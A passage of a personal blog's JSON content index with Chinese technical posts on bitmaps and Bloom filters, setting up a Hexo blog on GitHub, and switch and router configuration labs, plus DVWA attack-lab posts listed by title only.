bit位，所以只需要约12MB（约等于10的8次方）。这样，就用了只有12M左右的内存表示了所有的8位数的电话。依次读入每个电话号码，然后将bitmap相应位置为1，最后统计bit- map中为1的位数即为不同号码的个数。 位图法还可用来快速判断集合中某个数据是否存在。 例3：给40亿个不重复的unsigned int 的整数，没排过序的，然后再给一个数， 如何快速判断这个数是否在40亿个数当中? 解答：unsigned int最多有$2^{32}$个数，用Bit-map的方法，申请512M (512*20*8&#x3D;$2^{32}$) 的内存，一个bit位代表个unsigned int值。读入40亿个数，设置相应的bit位，读入要查询的数，查看相应bit位是否为1，为1表示存在，为0表示不存在。 本题若限制进一步节省内存，但可以允许一定的错误率，那么可以采用下节将要介绍的Bloom filter。 例4：在2.5亿个整数中找出只出现一次的整数，内存不足以容纳这2.5亿个整数。 方案1：采用2-Bitmap （每个数分配2bit, 00表示不存在，01表示出现一次， 10表示多次，11无意义）进行，共需内存$2^{32}$*2bit&#x3D;1GB内存，其中$2^{32}$是因为整数最多有$2^{32}$个。然后依次扫描这2.5亿个整数，查看Bitmap中对应位，如果是00变01, 01变10，10 保持不变。扫描结束后，查看bitmap，把对应位是01的整数输出即可。 方案2：也可采用Hash映射的方法，划分成多个小文件。然后在小文件中利用hash_map找出不重复的整数。 Bloom FilterBloom Filter（布隆过滤器）可以视为对Bit-map的扩展。Bit-map的作法是申请一个N位（N为集合中最大整数）的数组，然后每一位对应一个特定整数。 Bloom Filter 的基本原理是位数组与Hash函数联合使用，使用多个hash函数将元素映射到位数组的多个位上，多个置1的位共同表示该元素存在。具体而言，Bloom Filter 是一个包含了N位的位数组，数组的每一位都初始化为0，然后定义k个不同的Hash函数，每个Hash函数都可以将集合中的元素映射到位数组中的某一位。 当向集合中 插入 一个元素时，根据k个Hash函数可以得到位数组中的k个位，将这些位全部设置为1（如果一个位置多次被置为1，那么只有第一次会起作用，后面几次将没有任何效果）； 当要 查询 某个元素是否属于集合时，就使用k个哈希函数得到此元素对应的k个位，如果所有点都是1，那么元素在集合内（其实是可能在这个集合，因为有可能某个为1的位是被别的元素置1的，所以存在出错的可能）；如果有0，元素则不在集合内。 Bloom Filter的位数m通常要比集合中的最大元素小得多，可见，Bloom Filter是一种空间效率和时间效率很高的随机数据结构，但这种高效是有一-定代价的：在判断一个元素是否属于某个集合时，有可能会把不属于这个集合的元素误认为属于这个集合。因此，Bloom Filter不适合那些“零错误”应用场合。而在能容忍低错误率的应用场合下，Bloom Filter通过极少的错误换取了存储空间的极大节省。 倒排索引法正向索引是用来存储每个文档所包含的单词的列表，在正向索引中，文档占据了中心的位置，每个文档指向了一个它所包含的索引项的序列。倒排索引则相反，其存储包含某个单词的文档列表。 倒排索引也常被称为反向索引、置入档案或反向档案，是一种索引方法，被用来存储在全文检索下某个单词在一个文档或者一组文档中的存储位置的映射。它是文档检索系统中最常用的数据结构。 适用范围：搜索引擎的关键字查询。 以英文为例，下面是要被索引的文本： T0 &#x3D; “it is what it is”T1 &#x3D; “what is it”T2 &#x3D; “it is a banana” 我们就能得到下面的反向文件索引：（0、1、2代表上述3个文本，集合代表出现了该单词的文本） “a”：{2}“banana”：{2}“is”：{0, 1, 2}“it”：{0, 1, 2}“what”：{0, 1} 那么当用户检索的条件为”what”, “is”和I”it”，则将分别查询这三个关键词对应的文本集合，即{0, 1, 2}、{0, 1, 2}、{0, 1}，然后求对应集合的 交集，得到{0, 1}，这样就能确定包含关键字的文本。 可见，倒排索引在处理复杂的多关键字查询时，可在倒排表中先完成查询的并、交等逻辑运算，得到结果后再对记录进行存取。","raw":null,"content":null,"categories":[],"tags":[{"name":"计算机基础","slug":"计算机基础","permalink":"https://frankcao3.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}]},{"title":"利用hexo+gitHub搭建个人博客","slug":"利用hexo+gitHub搭建个人博客","date":"2020-08-15T12:26:40.000Z","updated":"2023-10-05T13:14:30.716Z","comments":true,"path":"posts/[object Object]/利用hexo+gitHub搭建个人博客/58062.html","link":"","permalink":"https://frankcao3.github.io/posts/[object%20Object]/%E5%88%A9%E7%94%A8hexo+gitHub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/58062","excerpt":"","text":"利用hexo+gitHub搭建个人博客 Hexo是一个基于nodejs 的静态博客网站生成器，为了实现远程访问，我们将其部署在github上面。重要的一点是，由于部署在github上时，只会在github上生成静态网页文件，而不上传hexo的配置文件、主题以及自己写的markdown文件，所以换新电脑时如果旧电脑的这些文件丢失，就无法重新部署了。所以为了解决这个问题，本次增加一个该项目仓库的分支，即使用2个分支master和hexo，用master来存储网页静态文件，用hexo来存放hexo环境和网站源文件。 一、利用hexo在本地搭建博客 （一）环境配置 node.js的安装，在官网直接下载安装即可。https://nodejs.org/npm已被包含在 node.js 中，输入node -v和npm -v检查安装是否成功。 git的安装配置。安装可参考廖雪峰的网站https://www.liaoxuefeng.com/wiki/896043488029600/896067074338496安装完成后，记得生成SSH key并添加到github。打开cmd，生成ssh密钥，命令为ssh-keygen -t rsa -C “yourEmail” -f &quot;id_rsa&quot;。然后可以看到C盘个人文件夹下出现了2个文件，id_rsa和id_ras.pub，分别为私钥和公钥。最后将id_ras.pub的内容复制，添加到github的SSH key。 （二）安装hexo框架 借助npm搭建镜像，但是利用其国内镜像会很慢，所以先利用npm安装 cnpm来保证访问速度，这里用淘宝的源，npm install -g cnpm --registry=https://registry.npm.taobao.org，-g代表全局安装。用cnpm -v检查安装是否成功。 利用 cnpm安装 hexo框架，命令为cnpm install -g hexo-cli，用hexo -v检查安装是否成功。 建站。创建自己博客的目录，我的是D:\\blogs，然后在该目录下操作。命令hexo init，初始化hexo。 启动hexo，命令为hexo server，访问其默认的本地地址localhost:4000可查看博客。 （三）在本地写博客 hexo搭建好之后，打开git bash使用 hexo new &quot;name&quot;创建一篇md文章，默认地址为D:\\blogs\\source\\_posts\\，可以进入该目录找到新建的文章，然后对其进行编辑。 编辑完成后，hexo clean 清除缓存，hexo generate生成静态文件，hexo server启动服务，再次访问localhost:4000可查看文章变动。 二、将博客部署到github上 首先在github上创建个人仓库，命名必须是用户名.github.io。 在D:\\blogs目录下，安装部署git的插件，cnpm install --save hexo-deployer-git。 deploy配置。在blogs目录下，修改_config.yml，配置deploy属性，type为git，repo为刚才新建的个人仓库的地址，branch为master（master分支下的文件由hexo命令管理）。（注意冒号后面有空格） 部署和编辑博客。用命令 hexo deploy部署博客。部署好之后就可以在本地hexo new &quot;name&quot;写好博客，然后hexo g，hexo d完成上传了。 至此博客其实就可以正常使用了，但是正如本文开篇的考虑，我们需要进一步完善，所以继续看以下内容。 三、在仓库新增hexo分支 参考文档：https://www.jianshu.com/p/153490a029a5 在博客项目上新建一个分支，命名为hexo，并设置为默认分支。然后打开git bash，在任意目录下，执行git clone git@github.com:FrankCao3/FrankCao3.github.io.git，将其克隆到本地，因为默认分支已经设成了hexo，所以clone时只clone了hexo。接下来在克隆到本地的FrankCao3.github.io中，把除了.git 文件夹外的所有文件都删掉，再把之前我们写的博客源文件全部复制过来，除了.deploy_git。然后在该目录下，执行如下命令。123git add . #保存所有文件到暂存区git commit –m &quot;add branch&quot; #提交变更,&quot;&quot;中为注释git push #推送到github，这里默认分支已设置为hexo，所以修改的是hexo 执行成功后可以在github上看hexo分支下文件有没有上传上去，其中node_modules、public、db.json已经被忽略掉了，没有关系，它们不需要上传的，因为在别的电脑上需要重新输入命令安装 。这样hexo分支下就存放好了博客网站的配置文件和markdown源文件。 四、更换电脑时的操作 先完成环境配置，安装node.js和git，记得生成和添加SSH key。然后安装hexo框架。以上步骤可以参考本文从开始到一（二）2节的内容。 安装好hexo框架后，不需要init，在自定义的目录下执行git clone git@github.com:FrankCao3/FrankCao3.github.io.git，直接克隆hexo分支下的文件，这样hexo的配置文件和源文件就下载下来了。然后进入这个FrankCao3.github.io文件夹，执行npm install，npm install hexo-deployer-git --save，然后hexo g，hexo d，完成hexo的生成部署。 接下来就可以正常写博客了。 五、写博客并提交到github 在D:\\blogs目录下，在本地hexo分支下打开git bash执行hexo new &quot;name&quot;新建博客并编辑。 上传源文件。要注意的是，由于前面使用了第2个分支hexo来存放源文件，所以我们先上传源文件，执行如下命令。123git add . #保存所有文件到暂存区git commit –m &quot;new blog&quot; #提交变更，&quot;&quot;中为注释git push #推送到github，这里默认分支已设置为hexo，所以修改的是hexo 执行hexo g，hexo d提交。（github中master分支下的文件由hexo命令管理）","raw":null,"content":null,"categories":[],"tags":[{"name":"搭建博客","slug":"搭建博客","permalink":"https://frankcao3.github.io/tags/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"}]},{"title":"1.VLAN实验","slug":"1.VLAN实验","date":"2020-08-14T16:00:00.000Z","updated":"2023-10-05T11:40:46.672Z","comments":true,"path":"posts/[object Object]/1.VLAN实验/undefined.html","link":"","permalink":"https://frankcao3.github.io/posts/[object%20Object]/1.VLAN%E5%AE%9E%E9%AA%8C/undefined","excerpt":"","text":"VLAN实验 实验拓扑 实验需求1.按图示为PC配置IP地址2.SW1和SW2上分别创建vlan10和vlan20，要求PC3和PC5属于vlan10，PC4和PV6属于vlan203.SW1和SW2相连的接口配置为trunk类型，允许vlan10和vlan20通过4.测试效果，同一vlan的PC可以互通，不同vlan的PC无法互通 实验解法1.按图示为PC配置IP地址 步骤1：配置PC3的IP地址为192.168.1.1&#x2F;24 步骤2：配置PC4的IP地址为192.168.1.2&#x2F;24 步骤3：配置PC5的IP地址为192.168.1.3&#x2F;24 步骤4：配置PC6的IP地址为192.168.1.4&#x2F;24 2.SW1和SW2上分别创建vlan10和vlan20，要求PC3和PC5属于vlan10，PC4和PV6属于vlan20 步骤 1：在 SW1 上创建 Vlan10 和 Vlan 20 123[SW1]vlan 10[SW1-vlan10]vlan 20[SW1-vlan20] 步骤 2：在 SW2 上创建 Vlan10 和 Vlan20 123[SW2]vlan 10[SW2-vlan10]vlan 20[SW2-vlan20] 3.SW1和SW2都把g1&#x2F;0&#x2F;1接口加入vlan10，g1&#x2F;0&#x2F;2接口加入vlan20 步骤1：在SW1上把g1&#x2F;0&#x2F;1接口加入到vlan10，把g1&#x2F;0&#x2F;2接口加入到vlan20 1234[SW1-vlan20]vlan 10[SW1-vlan10]port g1/0/1[SW1-vlan10]vlan 20[SW1-vlan20]port g1/0/2 步骤2：在SW2上把g1&#x2F;0&#x2F;1接口加入到vlan10，把g1&#x2F;0&#x2F;2接口加入到vlan20 1234[SW2-vlan20]vlan 10[SW2-vlan10]port g1/0/1[SW2-vlan10]vlan 20[SW2-vlan20]port g1/0/2 4.SW1和SW2的g1&#x2F;0&#x2F;3接口都配置为trunk，允许vlan10和vlan20通过 步骤1：在SW1上把g1&#x2F;0&#x2F;3接口配置为Trunk类型，并允许vlan10和vlan20通过 123[SW1]interface g1/0/3[SW1-GigabitEthernet1/0/3]port link-type trunk[SW1-GigabitEthernet1/0/3]port trunk permit vlan 10 20 步骤2：在SW2上把g1&#x2F;0&#x2F;3接口配置为Trunk类型，并允许vlan10和vlan20通过 123[SW2]interface g1/0/3[SW2-GigabitEthernet1/0/3]port link-type trunk[SW2-GigabitEthernet1/0/3]port trunk permit vlan 10 20 5.测试结果，如下所示，PC3可以PING通PC5，但无法PING通PC4和PC6 步骤1：在PC3上PingPC4，发现不能Ping通 步骤2：在PC3上PingPC5，发现可以Ping通 步骤3：在PC3上PingPC6，发现不能Ping通","raw":null,"content":null,"categories":[],"tags":[]},{"title":"DVWA靶场-SQL注入","slug":"DVWA靶场/1.SQL注入实战","date":"2020-08-14T16:00:00.000Z","updated":"2023-10-05T13:04:20.633Z","comments":true,"path":"posts/[object Object]/DVWA靶场/1.SQL注入实战/13924.html","link":"","permalink":"https://frankcao3.github.io/posts/[object%20Object]/DVWA%E9%9D%B6%E5%9C%BA/1.SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98/13924","excerpt":"","text":"1.SQL注入实战","raw":null,"content":null,"categories":[],"tags":[{"name":"DVWA靶场","slug":"DVWA靶场","permalink":"https://frankcao3.github.io/tags/DVWA%E9%9D%B6%E5%9C%BA/"}]},{"title":"DVWA靶场-反射型 XSS 攻击实战","slug":"DVWA靶场/4.反射型 XSS 攻击实战","date":"2020-08-14T16:00:00.000Z","updated":"2023-10-05T13:07:15.323Z","comments":true,"path":"posts/[object Object]/DVWA靶场/4.反射型 XSS 攻击实战/56867.html","link":"","permalink":"https://frankcao3.github.io/posts/[object%20Object]/DVWA%E9%9D%B6%E5%9C%BA/4.%E5%8F%8D%E5%B0%84%E5%9E%8B%20XSS%20%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/56867","excerpt":"","text":"4.反射型 XSS 攻击实战","raw":null,"content":null,"categories":[],"tags":[{"name":"DVWA靶场","slug":"DVWA靶场","permalink":"https://frankcao3.github.io/tags/DVWA%E9%9D%B6%E5%9C%BA/"}]},{"title":"DVWA靶场-存储型 XSS 攻击实战","slug":"DVWA靶场/4.存储型 XSS 攻击实战","date":"2020-08-14T16:00:00.000Z","updated":"2023-10-05T13:06:57.392Z","comments":true,"path":"posts/[object Object]/DVWA靶场/4.存储型 XSS 攻击实战/46010.html","link":"","permalink":"https://frankcao3.github.io/posts/[object%20Object]/DVWA%E9%9D%B6%E5%9C%BA/4.%E5%AD%98%E5%82%A8%E5%9E%8B%20XSS%20%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/46010","excerpt":"","text":"4.存储型 XSS 攻击实战","raw":null,"content":null,"categories":[],"tags":[{"name":"DVWA靶场","slug":"DVWA靶场","permalink":"https://frankcao3.github.io/tags/DVWA%E9%9D%B6%E5%9C%BA/"}]},{"title":"DVWA靶场-Web爆破攻击实战","slug":"DVWA靶场/2.Web爆破攻击实战","date":"2020-08-14T16:00:00.000Z","updated":"2023-10-05T13:06:08.006Z","comments":true,"path":"posts/[object Object]/DVWA靶场/2.Web爆破攻击实战/57923.html","link":"","permalink":"https://frankcao3.github.io/posts/[object%20Object]/DVWA%E9%9D%B6%E5%9C%BA/2.Web%E7%88%86%E7%A0%B4%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/57923","excerpt":"","text":"2.Web爆破攻击实战","raw":null,"content":null,"categories":[],"tags":[{"name":"DVWA靶场","slug":"DVWA靶场","permalink":"https://frankcao3.github.io/tags/DVWA%E9%9D%B6%E5%9C%BA/"}]},{"title":"DVWA靶场-命令注入攻击实战","slug":"DVWA靶场/3.命令注入攻击实战","date":"2020-08-14T16:00:00.000Z","updated":"2023-10-05T13:06:26.165Z","comments":true,"path":"posts/[object Object]/DVWA靶场/3.命令注入攻击实战/14352.html","link":"","permalink":"https://frankcao3.github.io/posts/[object%20Object]/DVWA%E9%9D%B6%E5%9C%BA/3.%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/14352","excerpt":"","text":"3.命令注入攻击实战","raw":null,"content":null,"categories":[],"tags":[{"name":"DVWA靶场","slug":"DVWA靶场","permalink":"https://frankcao3.github.io/tags/DVWA%E9%9D%B6%E5%9C%BA/"}]},{"title":"DVWA靶场-DOM型XSS攻击实战","slug":"DVWA靶场/4.DOM型XSS攻击实战","date":"2020-08-14T16:00:00.000Z","updated":"2023-10-05T13:06:41.565Z","comments":true,"path":"posts/[object Object]/DVWA靶场/4.DOM型XSS攻击实战/45651.html","link":"","permalink":"https://frankcao3.github.io/posts/[object%20Object]/DVWA%E9%9D%B6%E5%9C%BA/4.DOM%E5%9E%8BXSS%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/45651","excerpt":"","text":"4.DOM型XSS攻击实战","raw":null,"content":null,"categories":[],"tags":[{"name":"DVWA靶场","slug":"DVWA靶场","permalink":"https://frankcao3.github.io/tags/DVWA%E9%9D%B6%E5%9C%BA/"}]},{"title":"DVWA靶场-文件包含攻击实战","slug":"DVWA靶场/5.文件包含攻击实战","date":"2020-08-14T16:00:00.000Z","updated":"2023-10-05T13:07:30.447Z","comments":true,"path":"posts/[object Object]/DVWA靶场/5.文件包含攻击实战/27704.html","link":"","permalink":"https://frankcao3.github.io/posts/[object%20Object]/DVWA%E9%9D%B6%E5%9C%BA/5.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/27704","excerpt":"","text":"5.文件包含攻击实战","raw":null,"content":null,"categories":[],"tags":[{"name":"DVWA靶场","slug":"DVWA靶场","permalink":"https://frankcao3.github.io/tags/DVWA%E9%9D%B6%E5%9C%BA/"}]},{"title":"DVWA靶场-XSS攻击渗透报告","slug":"DVWA靶场/8.XSS攻击渗透报告","date":"2020-08-14T16:00:00.000Z","updated":"2023-10-05T13:08:38.917Z","comments":true,"path":"posts/[object Object]/DVWA靶场/8.XSS攻击渗透报告/35017.html","link":"","permalink":"https://frankcao3.github.io/posts/[object%20Object]/DVWA%E9%9D%B6%E5%9C%BA/8.XSS%E6%94%BB%E5%87%BB%E6%B8%97%E9%80%8F%E6%8A%A5%E5%91%8A/35017","excerpt":"","text":"8.XSS攻击渗透报告","raw":null,"content":null,"categories":[],"tags":[{"name":"DVWA靶场","slug":"DVWA靶场","permalink":"https://frankcao3.github.io/tags/DVWA%E9%9D%B6%E5%9C%BA/"}]},{"title":"DVWA靶场-文件上传攻击实战","slug":"DVWA靶场/6.文件上传攻击实战","date":"2020-08-14T16:00:00.000Z","updated":"2023-10-05T13:07:44.507Z","comments":true,"path":"posts/[object Object]/DVWA靶场/6.文件上传攻击实战/52620.html","link":"","permalink":"https://frankcao3.github.io/posts/[object%20Object]/DVWA%E9%9D%B6%E5%9C%BA/6.%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/52620","excerpt":"","text":"6.文件上传攻击实战","raw":null,"content":null,"categories":[],"tags":[{"name":"DVWA靶场","slug":"DVWA靶场","permalink":"https://frankcao3.github.io/tags/DVWA%E9%9D%B6%E5%9C%BA/"}]},{"title":"DVWA靶场-SQL注入爆表","slug":"DVWA靶场/7.SQL注入爆表","date":"2020-08-14T16:00:00.000Z","updated":"2023-10-05T13:08:03.934Z","comments":true,"path":"posts/[object Object]/DVWA靶场/7.SQL注入爆表/47846.html","link":"","permalink":"https://frankcao3.github.io/posts/[object%20Object]/DVWA%E9%9D%B6%E5%9C%BA/7.SQL%E6%B3%A8%E5%85%A5%E7%88%86%E8%A1%A8/47846","excerpt":"","text":"7.SQL注入爆表","raw":null,"content":null,"categories":[],"tags":[{"name":"DVWA靶场","slug":"DVWA靶场","permalink":"https://frankcao3.github.io/tags/DVWA%E9%9D%B6%E5%9C%BA/"}]},{"title":"1.VLAN实验","slug":"数通/1.VLAN实验","date":"2020-08-14T16:00:00.000Z","updated":"2023-10-05T11:40:46.672Z","comments":true,"path":"posts/[object Object]/数通/1.VLAN实验/15024.html","link":"","permalink":"https://frankcao3.github.io/posts/[object%20Object]/%E6%95%B0%E9%80%9A/1.VLAN%E5%AE%9E%E9%AA%8C/15024","excerpt":"","text":"VLAN实验 实验拓扑 实验需求1.按图示为PC配置IP地址2.SW1和SW2上分别创建vlan10和vlan20，要求PC3和PC5属于vlan10，PC4和PV6属于vlan203.SW1和SW2相连的接口配置为trunk类型，允许vlan10和vlan20通过4.测试效果，同一vlan的PC可以互通，不同vlan的PC无法互通 实验解法1.按图示为PC配置IP地址 步骤1：配置PC3的IP地址为192.168.1.1&#x2F;24 步骤2：配置PC4的IP地址为192.168.1.2&#x2F;24 步骤3：配置PC5的IP地址为192.168.1.3&#x2F;24 步骤4：配置PC6的IP地址为192.168.1.4&#x2F;24 2.SW1和SW2上分别创建vlan10和vlan20，要求PC3和PC5属于vlan10，PC4和PV6属于vlan20 步骤 1：在 SW1 上创建 Vlan10 和 Vlan 20 123[SW1]vlan 10[SW1-vlan10]vlan 20[SW1-vlan20] 步骤 2：在 SW2 上创建 Vlan10 和 Vlan20 123[SW2]vlan 10[SW2-vlan10]vlan 20[SW2-vlan20] 3.SW1和SW2都把g1&#x2F;0&#x2F;1接口加入vlan10，g1&#x2F;0&#x2F;2接口加入vlan20 步骤1：在SW1上把g1&#x2F;0&#x2F;1接口加入到vlan10，把g1&#x2F;0&#x2F;2接口加入到vlan20 1234[SW1-vlan20]vlan 10[SW1-vlan10]port g1/0/1[SW1-vlan10]vlan 20[SW1-vlan20]port g1/0/2 步骤2：在SW2上把g1&#x2F;0&#x2F;1接口加入到vlan10，把g1&#x2F;0&#x2F;2接口加入到vlan20 1234[SW2-vlan20]vlan 10[SW2-vlan10]port g1/0/1[SW2-vlan10]vlan 20[SW2-vlan20]port g1/0/2 4.SW1和SW2的g1&#x2F;0&#x2F;3接口都配置为trunk，允许vlan10和vlan20通过 步骤1：在SW1上把g1&#x2F;0&#x2F;3接口配置为Trunk类型，并允许vlan10和vlan20通过 123[SW1]interface g1/0/3[SW1-GigabitEthernet1/0/3]port link-type trunk[SW1-GigabitEthernet1/0/3]port trunk permit vlan 10 20 步骤2：在SW2上把g1&#x2F;0&#x2F;3接口配置为Trunk类型，并允许vlan10和vlan20通过 123[SW2]interface g1/0/3[SW2-GigabitEthernet1/0/3]port link-type trunk[SW2-GigabitEthernet1/0/3]port trunk permit vlan 10 20 5.测试结果，如下所示，PC3可以PING通PC5，但无法PING通PC4和PC6 步骤1：在PC3上PingPC4，发现不能Ping通 步骤2：在PC3上PingPC5，发现可以Ping通 步骤3：在PC3上PingPC6，发现不能Ping通","raw":null,"content":null,"categories":[],"tags":[{"name":"实训-网络建设部分","slug":"实训-网络建设部分","permalink":"https://frankcao3.github.io/tags/%E5%AE%9E%E8%AE%AD-%E7%BD%91%E7%BB%9C%E5%BB%BA%E8%AE%BE%E9%83%A8%E5%88%86/"}]},{"title":"2.IRF、聚合实验","slug":"数通/2.IRF、聚合实验","date":"2020-08-14T16:00:00.000Z","updated":"2023-10-05T11:40:46.679Z","comments":true,"path":"posts/[object Object]/数通/2.IRF、聚合实验/24202.html","link":"","permalink":"https://frankcao3.github.io/posts/[object%20Object]/%E6%95%B0%E9%80%9A/2.IRF%E3%80%81%E8%81%9A%E5%90%88%E5%AE%9E%E9%AA%8C/24202","excerpt":"","text":"IRF、聚合实验 实验拓扑 实验需求1.SW1和SW2配置IRF，堆叠为一台交换机2.SW3和SW4分别与IRF设备配置链路聚合3.SW3和SW4上分别把连接PC的接口加入VLAN 104.PC5和PC6按图所示配置IP地址，要求PC5和PC6能够ping通 实验解法1.SW1和SW2配置IRF，堆叠为一台交换机 步骤1：修改SW2的设备ID为2，保存配置，并重启生效 1234[SW2]irf member 1 renumber 2[SW2]save[SW2]quit&lt;SW2&gt;reboot 步骤2：手动关闭SW1的F1&#x2F;0&#x2F;53和F1&#x2F;0&#x2F;54口 1234[SW1]interface f1/0/53[SW1-FortyGigE1/0/53]shutdown[SW1]interface f1/0/54[SW1-FortyGigE1/0/53]shutdown 步骤3：在SW1上创建IRF-Port1&#x2F;1堆叠口，并把F1&#x2F;0&#x2F;53和F1&#x2F;0&#x2F;54口加入到堆叠口 123[SW1]irf-port 1/1[SW1-irf-port1/1]port group interface f1/0/53[SW1-irf-port1/1]port group interface f1/0/54 步骤4：在SW1上手动开启F1&#x2F;0&#x2F;53和F1&#x2F;0&#x2F;54口 1234[SW1]interface f1/0/53[SW1-FortyGigE1/0/53]undo shutdown[SW1]interface f1/0/54[SW1-FortyGigE1/0/53]undo shutdown 步骤5：在SW1上保存配置，并激活IRF配置 12[SW1]save[SW1]irf-port-configuration active 步骤6：在SW2重启完成后，手动关闭F2&#x2F;0&#x2F;53和F2&#x2F;0&#x2F;54口 1234[SW2]interface f2/0/53[SW2-FortyGigE2/0/53]shutdown[SW2]interface f2/0/54[SW2-FortyGigE2/0/53]shutdown 步骤7：在SW2上创建IRF-Port2&#x2F;2堆叠口，并把F2&#x2F;0&#x2F;53和F2&#x2F;0&#x2F;54口加入到堆叠口 123[SW2]irf-port 2/2[SW2-irf-port2/2]port group interface f2/0/53[SW2-irf-port2/2]port group interface f2/0/54 步骤8：在SW2上手动开启F2&#x2F;0&#x2F;53和F2&#x2F;0&#x2F;54口 1234[SW2]interface f2/0/53[SW2-FortyGigE2/0/53]undo shutdown[SW2]interface f2/0/54[SW2-FortyGigE2/0/54]undo shutdown 步骤9：在SW2上保存配置，并激活IRF配置。然后SW2会自动重启，重启完成后SW2自动升级为slave设备，与SW1配置同步，形成堆叠 12[SW2]save[SW2]irf-port-configuration active 步骤10：在SW1上修改堆叠设备名称为IRF-SW 1[SW1]sysname IRF-SW 步骤11：用display irf查看irf配置，确认配置是否正确 2.SW3和SW4分别与IRF设备配置链路聚合 步骤1：在SW3上创建1号聚合组，并把G1&#x2F;0&#x2F;1和G1&#x2F;0&#x2F;2加入聚合组 12345[SW3]interface Bridge-Aggregation 1[SW3-Bridge-Aggregation1]interface g1/0/1[SW3-GigabitEthernet1/0/1]port link-aggregation group 1[SW3-GigabitEthernet1/0/1]interface g1/0/2[SW3-GigabitEthernet1/0/2]port link-aggregation group 1 步骤2：在SW4上创建2号聚合组，并把G1&#x2F;0&#x2F;1和G1&#x2F;0&#x2F;2加入聚合组 12345[SW4]interface Bridge-Aggregation 2[SW4-Bridge-Aggregation1]interface g1/0/1[SW4-GigabitEthernet1/0/1]port link-aggregation group 2[SW4-GigabitEthernet1/0/1]interface g1/0/2[SW4-GigabitEthernet1/0/2]port link-aggregation group 2 步骤3：在IRF-SW上创建1号聚合组，与SW3建立链路聚合，创建2号聚合组，与SW4建立链路聚合 12345678910[IRF-SW]interface Bridge-Aggregation 1[IRF-SW-Bridge-Aggregation1]interface g1/0/3[IRF-SW-GigabitEthernet1/0/3]port link-aggregation group 1[IRF-SW-GigabitEthernet1/0/3]interface g2/0/3[IRF-SW-GigabitEthernet2/0/3]port link-aggregation group 1[IRF-SW-GigabitEthernet2/0/3]interface Bridge-Aggregation 2[IRF-SW-Bridge-Aggregation2]interface g1/0/4[IRF-SW-GigabitEthernet1/0/4]port link-aggregation group 2[IRF-SW-GigabitEthernet1/0/4]interface g2/0/4[IRF-SW-GigabitEthernet2/0/4]port link-aggregation group 2 3.SW3和SW4上分别把连接PC的接口加入VLAN 10 步骤1：在SW3上把G1&#x2F;0&#x2F;3加入VLAN 10，把聚合口配置为Trunk，放行VLAN 10 12345[SW3]vlan 10[sw3-vlan10]port g1/0/3[sw3-vlan10]interface Bridge-Aggregation 1[SW1-Bridge-Aggregation1]port link-t trunk[SW1-Bridge-Aggregation1]port trunk permit vlan 10 步骤2：在SW4上把G1&#x2F;0&#x2F;3加入VLAN 10，把聚合口配置为Trunk，放行VLAN 10 12345[SW4]vlan 10[sw4-vlan10]port g1/0/3[sw4-vlan10]interface Bridge-Aggregation 2[SW4-Bridge-Aggregation1]port link-t trunk[SW4-Bridge-Aggregation1]port trunk permit vlan 10 步骤3：在IRF-SW上创建VLAN 10，并把2个聚合口配置为Trunk，放行VLAN 10 1234567[IRF-SW]vlan 10[IRF-SW-vlan10]interface Bridge-Aggregation 1[IRF-SW-Bridge-Aggregation1]port link-t trunk[IRF-SW-Bridge-Aggregation1]port trunk permit vlan 10[IRF-SW-Bridge-Aggregation1]interface Bridge-Aggregation 2[IRF-SW-Bridge-Aggregation2]port link-t trunk[IRF-SW-Bridge-Aggregation2]port trunk permit vlan 10 4.PC5和PC6按图所示配置IP地址，要求PC5和PC6能够ping通 步骤1：配置PC5的IP地址为192.168.1.1&#x2F;24 步骤2：配置PC6的IP地址为192.168.1.2&#x2F;24 步骤3：在PC5上PingPC6，发现可以Ping通","raw":null,"content":null,"categories":[],"tags":[{"name":"实训-网络建设部分","slug":"实训-网络建设部分","permalink":"https://frankcao3.github.io/tags/%E5%AE%9E%E8%AE%AD-%E7%BD%91%E7%BB%9C%E5%BB%BA%E8%AE%BE%E9%83%A8%E5%88%86/"}]},{"title":"3.route-static","slug":"数通/3.route-static","date":"2020-08-14T16:00:00.000Z","updated":"2023-10-05T11:40:46.681Z","comments":true,"path":"posts/[object Object]/数通/3.route-static/52184.html","link":"","permalink":"https://frankcao3.github.io/posts/[object%20Object]/%E6%95%B0%E9%80%9A/3.route-static/52184","excerpt":"","text":"静态路由实验 实验拓扑 实验需求1.按照图示配置 IP 地址1.按照如下路径规划配置静态路由，实现连接 PC 的业务网段互通 (1)192.168.1.0/24 网段到达 192.168.2.0/24 网段经过 R1，R2，R3 (2)192.168.2.0/24 网段到达 192.168.1.0/24 网段经过 R3，R4，R1 (3)192.168.1.0/24 网段到达 192.168.3.0/24 网段经过 R1，R4，R5 (4)192.168.2.0/24 网段到达 192.168.3.0/24 网段经过 R3，R4，R5 (5)192.168.3.0/24 网段到达 192.168.1.0/24 网段和 192.168.2.0/24 网段的路由来回一致 (6)R5 上不允许出现到达其他业务网段的明细路由 (7)所有经过 R4 和 R5 的流量通过等价路由实现负载分担 实验解法1.按拓扑图配置 IP 地址 步骤 1：配置PC6的IP地址为192.168.1.2&#x2F;24，网关为192.168.1.1 步骤 2：配置PC7的IP地址为192.168.2.2&#x2F;24，网关为192.168.2.1 步骤 3：配置PC8的IP地址为192.168.3.2&#x2F;24，网关为192.168.3.1 步骤 4：配置R1的接口IP 123456[R1]int g0/2[R1-GigabitEthernet0/2]ip address 192.168.1.1 24[R1-GigabitEthernet0/2]int g0/0[R1-GigabitEthernet0/0]ip address 10.2.2.1 24[R1-GigabitEthernet0/0]int g0/1[R1-GigabitEthernet0/1]ip address 10.1.1.1 24 步骤 5：配置R2的接口IP 1234[R2]int g0/0[R2-GigabitEthernet0/0]ip address 10.2.2.2 24[R2-GigabitEthernet0/0]int g0/1[R2-GigabitEthernet0/1]ip address 